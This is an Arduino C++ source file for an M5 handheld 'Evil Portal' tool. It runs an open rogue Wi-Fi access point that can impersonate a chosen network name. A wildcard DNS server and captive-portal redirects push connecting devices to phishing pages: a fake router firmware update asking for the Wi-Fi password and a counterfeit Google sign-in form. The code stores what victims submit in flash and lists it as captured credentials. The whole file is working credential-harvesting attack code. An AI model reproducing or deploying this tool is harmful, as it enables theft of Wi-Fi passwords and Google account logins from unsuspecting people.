

#include "wifi_menu.h"
#include "config.h"
#include "settings.h"
#include "keyboard.h"
#include "ui.h"
#include "menu.h"
#include "sd_helper.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <Preferences.h>
#include <vector>

static AsyncWebServer *epServer    = nullptr;
static DNSServer      *epDns       = nullptr;
static String          epApName    = "Free Wifi";
static uint8_t         epChannel   = 6;
static IPAddress       epGateway   = IPAddress(172, 0, 0, 1);
static String          epHtmlPage  = "";
static String          epLastCred  = "";
static int             epCredCount = 0;
static bool            epDeauthHold = false;
static wifi_mode_t     epOrigMode  = WIFI_MODE_NULL;
static bool            epWasConnected = false;
static String          epCredsNvs  = "";   

#define EP_MAX_CREDS 12

static const char EP_HTML_ROUTER[] PROGMEM =
    "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
    "<title>Router Update</title>"
    "<style>body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;"
    "background-color:#d3d3d3;display:flex;justify-content:center;align-items:center;"
    "height:100vh;margin:0;padding:10px;box-sizing:border-box;}"
    ".container{background-color:white;padding:20px;border-radius:10px;"
    "box-shadow:0 0 15px rgba(0,0,0,0.2);text-align:center;max-width:360px;width:100%;}"
    "h1{color:#333;font-size:22px;margin-bottom:15px;}"
    "p{color:#666;font-size:15px;margin-bottom:20px;}"
    "input[type='password']{width:100%;padding:12px;margin:10px 0;border-radius:5px;"
    "border:1px solid #ccc;font-size:16px;box-sizing:border-box;}"
    "button{width:100%;padding:12px;background-color:#007bff;color:white;border:none;"
    "border-radius:5px;cursor:pointer;font-size:16px;}</style></head><body>"
    "<div class='container'>"
    "<h1>Router Update</h1>"
    "<p>Router firmware update required. Enter your Wi-Fi password to update.</p>"
    "<form id='submit-form' action='/post'>"
    "<input type='password' name='password' placeholder='Wi-Fi network password' required>"
    "<button type='submit'>Update</button></form></div></body></html>";

static const char EP_HTML_GOOGLE[] PROGMEM =
    "<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title>"
    "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'>"
    "<style>body{font-family:Arial,sans-serif;background:#FFFFFF;margin:0;padding:0;}"
    ".container{max-width:380px;margin:40px auto;padding:24px;}"
    ".logo{font-size:28px;color:#4285f4;font-weight:500;text-align:center;margin-bottom:8px;}"
    ".sub{font-size:24px;color:#202124;text-align:center;margin-bottom:24px;}"
    "input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;"
    "font-size:16px;box-sizing:border-box;}"
    "button{background:#1a73e8;color:white;border:none;padding:12px 24px;border-radius:4px;"
    "font-size:14px;cursor:pointer;float:right;}</style></head><body>"
    "<div class='container'>"
    "<div class='logo'>Google</div>"
    "<div class='sub'>Sign in</div>"
    "<div style='text-align:center;color:#5f6368;font-size:14px;margin-bottom:24px;'>"
    "Use your Google Account</div>"
    "<form action='/post'>"
    "<input name='email' type='text' placeholder='Email or phone' required>"
    "<input name='password' type='password' placeholder='Enter your password' required>"
    "<button type='submit'>Next</button></form></div></body></html>";

static const char EP_HTML_SUCCESS[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1.0'>"
    "<title>Connected</title><style>body{font-family:Arial,sans-serif;text-align:center;"
    "padding:40px;background:#f8f9fa;}"
    ".box{background:white;max-width:400px;margin:auto;padding:30px;border-radius:8px;"
    "box-shadow:0 2px 6px rgba(0,0,0,0.1);}"
    ".ok{color:#34a853;font-size:48px;margin-bottom:16px;}"
    "h1{color:#202124;font-size:22px;margin:0 0 12px;}"
    "p{color:#5f6368;font-size:14px;}</style></head><body>"
    "<div class='box'><div class='ok'>&#10004;</div>"
    "<h1>You're connected</h1>"
    "<p>Your device is now connected to the internet.</p>"
    "</div></body></html>";

static void epSaveCred(const String &cred)
{
    if (epCredsNvs.length() == 0) {
        Preferences p;
        p.begin("kiten", true);
        epCredsNvs = p.getString("epcreds", "");
        p.end();
    }
    epCredsNvs = cred + "|" + epCredsNvs;
    
    int count = 0;
    int idx = 0;
    int lastCut = -1;
    while (idx < (int)epCredsNvs.length() && count < EP_MAX_CREDS) {
        int pipe = epCredsNvs.indexOf('|', idx);
        if (pipe < 0) break;
        idx = pipe + 1;
        count++;
        lastCut = idx;
    }
    if (count >= EP_MAX_CREDS && lastCut > 0) {
        epCredsNvs = epCredsNvs.substring(0, lastCut - 1);
    }
    
    if (epCredsNvs.length() > 2000) epCredsNvs = epCredsNvs.substring(0, 2000);

    Preferences p;
    p.begin("kiten", false);
    p.putString("epcreds", epCredsNvs);
    p.end();
}

static void epSendRedirect(AsyncWebServerRequest *req)
{
    AsyncWebServerResponse *resp = req->beginResponse(302);
    resp->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
    req->send(resp);
}

static void epHandleRoot(AsyncWebServerRequest *req)
{
    req->send(200, "text/html", epHtmlPage);
}

static void epHandlePost(AsyncWebServerRequest *req)
{
    String cred = "";
    int args = req->args();
    for (int i = 0; i < args; i++) {
        String k = req->argName(i);
        String v = req->arg(i);
        if (k == "q" || k == "P1" || k == "P2" || k == "P3" || k == "P4") continue;
        if (cred.length() > 0) cred += " | ";
        cred += k + "=" + v;
    }
    if (cred.length() > 0) {
        epCredCount++;
        epLastCred = cred;
        epSaveCred(cred);
    }
    req->send(200, "text/html", EP_HTML_SUCCESS);
}

static void epSetupRoutes()
{
    epServer->on("/", HTTP_GET, epHandleRoot);
    epServer->on("/post", HTTP_ANY, epHandlePost);

    
    epServer->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *r){ epSendRedirect(r); });   
    epServer->on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *r){ epSendRedirect(r); });
    epServer->on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *r){ epSendRedirect(r); }); 
    epServer->on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *r){ epSendRedirect(r); }); 
    epServer->on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *r){ epSendRedirect(r); }); 
    epServer->on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *r){ epSendRedirect(r); });
    epServer->on("/redirect", HTTP_GET, [](AsyncWebServerRequest *r){ epSendRedirect(r); });
    epServer->on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *r){ epSendRedirect(r); });
    epServer->on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest *r){ epSendRedirect(r); });
    epServer->on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *r){ epSendRedirect(r); });
    epServer->on("/detectportal.firefox.com/success.txt", HTTP_GET,
                 [](AsyncWebServerRequest *r){ epSendRedirect(r); });
    epServer->on("/client.msftconnecttest.com/redirect", HTTP_GET,
                 [](AsyncWebServerRequest *r){ epSendRedirect(r); });

    
    epServer->onNotFound([](AsyncWebServerRequest *req) {
        String url = req->url();
        if (url.indexOf("detectportal") != -1 || url.indexOf("connecttest") != -1 ||
            url.indexOf("success") != -1 || url.indexOf("generate") != -1 ||
            url.indexOf("msftconnecttest") != -1) {
            epSendRedirect(req);
        } else if (req->args() > 0) {
            epHandlePost(req);
        } else {
            epHandleRoot(req);
        }
    });
}

static void epDrawScreen()
{
    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("EVIL PORTAL", 4, 28);

    logClear();
    String apDisplay = epApName;
    if (apDisplay.length() > 28) apDisplay = apDisplay.substring(0, 28) + "...";
    logPrint("AP: " + apDisplay);
    logPrint("IP: " + WiFi.softAPIP().toString());
    logPrint("Ch:  " + String(epChannel));
    logPrint("Victims: " + String(epCredCount));
    if (epLastCred.length() > 0) {
        
        String c = epLastCred;
        if (c.length() > 60) c = c.substring(0, 60) + "...";
        logPrint("Last: " + c);
    }
    logPrint("");
    logPrint("Sel: pause deauth");
    logPrint("Back: exit");
    logRender();
}

void evilPortalImpl()
{
    
    String name = keyboard("Free Wifi", 30, "Evil Portal SSID:");
    if (name == "\x1B" || name.length() == 0) name = "Free Wifi";
    epApName = name;

    
    String chosenHtml;
    std::vector<Option> tplOpts = {
        {"Router Update",  [&chosenHtml]() { chosenHtml = String(EP_HTML_ROUTER); }},
        {"Google Sign-in", [&chosenHtml]() { chosenHtml = String(EP_HTML_GOOGLE); }},
        {"Load from SD",   [&chosenHtml]() {
            
            if (!kitenSdBegin()) {
                displayError("SD card not found", true);
                return;
            }
            auto files = kitenSdListFiles("/", ".html,.htm");
            if (files.empty()) {
                displayError("No .html files\nfound on SD", true);
                return;
            }
            std::vector<Option> fileOpts;
            for (const String &f : files) {
                fileOpts.push_back({f, [&chosenHtml, f]() {
                    String html = kitenSdReadFile(f);
                    if (html.length() == 0) {
                        displayError("Failed to read\n" + f, true);
                        return;
                    }
                    chosenHtml = html;
                    displayInfo("Loaded:\n" + f, false);
                }});
            }
            fileOpts.push_back({"Back", [](){}});
            loopOptions(fileOpts, MENU_TYPE_REGULAR, "Pick HTML on SD");
        }},
        {"Back",          [](){}},
    };
    int sel = loopOptions(tplOpts, MENU_TYPE_REGULAR, "Pick Template");
    if (sel == -1 || sel == (int)tplOpts.size() - 1) return;
    
    
    if (chosenHtml.length() == 0) {
        chosenHtml = String(EP_HTML_ROUTER);
    }
    epHtmlPage = chosenHtml;

    
    std::vector<Option> chOpts;
    for (int c = 1; c <= 11; c++) {
        chOpts.push_back({String(c), [c]() { epChannel = (uint8_t)c; }});
    }
    chOpts.push_back({"Back", [](){}});
    int cs = loopOptions(chOpts, MENU_TYPE_REGULAR, "Pick Channel");
    if (cs == -1 || cs == (int)chOpts.size() - 1) return;

    
    epOrigMode = WiFi.getMode();
    epWasConnected = (WiFi.status() == WL_CONNECTED);
    epCredCount = 0;
    epLastCred = "";
    epDeauthHold = false;

    
    WiFi.mode(WIFI_AP);
    IPAddress gw(172, 0, 0, 1);
    if (!kitenConfig.evilGatewayIp.isEmpty()) {
        gw.fromString(kitenConfig.evilGatewayIp);
    }
    epGateway = gw;
    WiFi.softAPConfig(epGateway, epGateway, IPAddress(255, 255, 255, 0));
    if (!WiFi.softAP(epApName.c_str(), "", epChannel)) {
        displayError("Failed to start AP", true);
        WiFi.mode(epOrigMode);
        return;
    }
    delay(500);

    
    epDns = new DNSServer();
    epDns->start(53, "*", WiFi.softAPIP());

    epServer = new AsyncWebServer(80);
    epSetupRoutes();
    epServer->begin();

    
    bool shouldExit = false;
    bool shouldRedraw = true;
    for (;;) {
        M5.update();
        pollKeyboard();
        epDns->processNextRequest();

        if (shouldRedraw) {
            epDrawScreen();
            shouldRedraw = false;
        }

        if (check(EscPress)) {
            
            std::vector<Option> exitOpts = {
                {"Exit Portal", [&shouldExit]() { shouldExit = true; }},
                {"View Creds",  [&shouldRedraw]() {
                    
                    Preferences p;
                    p.begin("kiten", true);
                    String all = p.getString("epcreds", "");
                    p.end();
                    std::vector<Option> copts;
                    if (all.length() > 0) {
                        int idx = 0;
                        int n = 0;
                        while (idx < (int)all.length() && n < EP_MAX_CREDS) {
                            int pipe = all.indexOf('|', idx);
                            String entry = (pipe < 0) ? all.substring(idx) : all.substring(idx, pipe);
                            if (entry.length() > 0) {
                                copts.push_back({entry, [](){}});
                                n++;
                            }
                            if (pipe < 0) break;
                            idx = pipe + 1;
                        }
                    }
                    if (copts.empty()) {
                        copts.push_back({"No credentials yet", [](){}});
                    }
                    copts.push_back({"Back", [](){}});
                    loopOptions(copts, MENU_TYPE_REGULAR, "Captured Creds");
                    shouldRedraw = true;
                }},
                {"Resume",     [&shouldRedraw]() { shouldRedraw = true; }},
            };
            int e = loopOptions(exitOpts, MENU_TYPE_REGULAR, "Evil Portal");
            (void)e;
            if (shouldExit) break;
            waitAllKeysReleased();
        }
        if (check(SelPress)) {
            epDeauthHold = !epDeauthHold;
            shouldRedraw = true;
            waitAllKeysReleased();
        }

        
        static int lastDrawnCount = -1;
        if (lastDrawnCount != epCredCount) {
            lastDrawnCount = epCredCount;
            shouldRedraw = true;
        }

        delay(5);
    }

    
    epServer->end();
    delay(100);
    epDns->stop();
    delete epServer; epServer = nullptr;
    delete epDns;    epDns    = nullptr;
    WiFi.softAPdisconnect(true);
    delay(100);

    
    if (epWasConnected || epOrigMode != WIFI_MODE_NULL) {
        WiFi.mode(epOrigMode);
        delay(200);
        if (epWasConnected) {
            WiFi.begin();   
            unsigned long start = millis();
            while (WiFi.status() != WL_CONNECTED && millis() - start < 5000) delay(100);
        }
    } else {
        WiFi.mode(WIFI_OFF);
    }

    displayInfo("Portal stopped\nCaptured: " + String(epCredCount) + " cred(s)", true);
}

void evilPortalTargetedImpl(const String &tssid, uint8_t channel, bool deauth, bool verify)
{
    (void)deauth; (void)verify;
    epApName = tssid.length() > 0 ? tssid : "Free Wifi";
    epChannel = channel > 0 ? channel : 6;
    epHtmlPage = String(EP_HTML_ROUTER);
    epOrigMode = WiFi.getMode();
    epWasConnected = (WiFi.status() == WL_CONNECTED);
    epCredCount = 0;
    epLastCred = "";
    epDeauthHold = false;

    WiFi.mode(WIFI_AP);
    epGateway = IPAddress(172, 0, 0, 1);
    WiFi.softAPConfig(epGateway, epGateway, IPAddress(255, 255, 255, 0));
    if (!WiFi.softAP(epApName.c_str(), "", epChannel)) {
        displayError("Failed to start AP", true);
        WiFi.mode(epOrigMode);
        return;
    }
    delay(500);
    epDns = new DNSServer();
    epDns->start(53, "*", WiFi.softAPIP());
    epServer = new AsyncWebServer(80);
    epSetupRoutes();
    epServer->begin();

    bool shouldRedraw = true;
    for (;;) {
        M5.update();
        pollKeyboard();
        epDns->processNextRequest();
        if (shouldRedraw) { epDrawScreen(); shouldRedraw = false; }
        if (check(EscPress)) break;
        static int last = -1;
        if (last != epCredCount) { last = epCredCount; shouldRedraw = true; }
        delay(5);
    }

    epServer->end();
    delay(100);
    epDns->stop();
    delete epServer; epServer = nullptr;
    delete epDns;    epDns    = nullptr;
    WiFi.softAPdisconnect(true);
    delay(100);
    if (epWasConnected || epOrigMode != WIFI_MODE_NULL) {
        WiFi.mode(epOrigMode);
        delay(200);
        if (epWasConnected) WiFi.begin();
    } else {
        WiFi.mode(WIFI_OFF);
    }
}
